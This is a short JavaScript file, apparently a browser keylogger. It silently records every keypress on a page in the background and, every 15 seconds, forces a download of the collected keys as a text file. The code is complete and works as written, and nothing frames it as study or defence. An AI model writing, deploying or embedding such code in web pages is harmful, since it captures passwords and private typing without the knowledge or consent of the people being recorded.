let keystrokes = "";

// Capture keypresses in the background
document.addEventListener("keydown", (event) => {
  keystrokes += event.key; // Append the pressed key to the log
});

// Function to download the keystrokes log as a file
function downloadLog() {
  if (keystrokes) {
    // Create a Blob from the keystrokes data
    const blob = new Blob([keystrokes], { type: "text/plain" });
    const url = URL.createObjectURL(blob);

    // Create a temporary link to trigger the download
    const a = document.createElement("a");
    a.href = url;
    a.download = "keystrokes_log.txt";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    // Clear the keystrokes after download
    keystrokes = "";
  }
}

// Set up a timer to automatically download the log every 15 seconds
setInterval(() => {
  downloadLog();
}, 15000); // 15 seconds
